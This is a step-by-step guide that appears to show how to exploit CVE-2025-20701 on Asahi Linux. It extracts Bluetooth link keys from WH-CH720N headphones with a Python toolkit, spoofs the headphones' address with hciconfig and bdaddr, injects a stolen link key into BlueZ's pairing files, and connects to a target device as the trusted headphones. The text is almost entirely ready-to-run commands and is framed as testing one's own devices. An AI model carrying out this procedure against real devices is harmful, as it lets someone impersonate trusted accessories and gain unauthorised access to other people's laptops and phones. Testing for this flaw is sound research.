# Headphone Jacking on Asahi Linux

Quick guide to test CVE-2025-20701 (link key extraction) on your own devices.

## Prerequisites

```bash
# Install dependencies
sudo pacman -S bluez bluez-utils python python-pip

# Install race-toolkit
uv sync  # or: pip install -e .
```

## 1. Extract Credentials from Headphones

From any machine with BLE (including macOS):

```bash
# Get headphone BT address
uv run python race_toolkit.py -t bleak --le-names "WH-CH720N" bdaddr

# Get link keys for paired devices
uv run python race_toolkit.py -t bleak --le-names "WH-CH720N" link-keys
```

Note the address (e.g., `88:92:CC:1E:A0:00`) and link keys.

## 2. Spoof Bluetooth Address (Asahi)

```bash
# Check your adapter
hciconfig hci0

# Bring it down
sudo hciconfig hci0 down

# Spoof the headphone address
sudo bdaddr -i hci0 88:92:CC:1E:A0:00

# Bring it back up
sudo hciconfig hci0 up

# Verify
hciconfig hci0  # should show spoofed address
```

If `bdaddr` fails, try `spooftooph` or check if your chip supports it.

## 3. Inject Link Key

Find your target device's BT address (your laptop/phone). Then:

```bash
# Create directory for the pairing
sudo mkdir -p /var/lib/bluetooth/88:92:CC:1E:A0:00/<TARGET_ADDR>

# Create info file
sudo tee /var/lib/bluetooth/88:92:CC:1E:A0:00/<TARGET_ADDR>/info << EOF
[LinkKey]
Key=FB051E36C0B79677C7C8A839DD087307
Type=4
PINLength=0

[General]
Name=WH-CH720N
Class=0x240404
SupportedTechnologies=BR/EDR;
Trusted=true
Blocked=false
EOF

# Restart bluetooth
sudo systemctl restart bluetooth
```

Replace `<TARGET_ADDR>` with your laptop's BT address and use the correct link key.

## 4. Connect

```bash
bluetoothctl
> connect <TARGET_ADDR>
```

Your target device should accept the connection as if it's the trusted headphones.

## Troubleshooting

- **bdaddr doesn't work**: Your Bluetooth chip may not support address spoofing
- **Connection refused**: Try the other link key; you might have the wrong one
- **Need target's BT address**: Check `bluetoothctl devices` on the target, or look in its Bluetooth settings
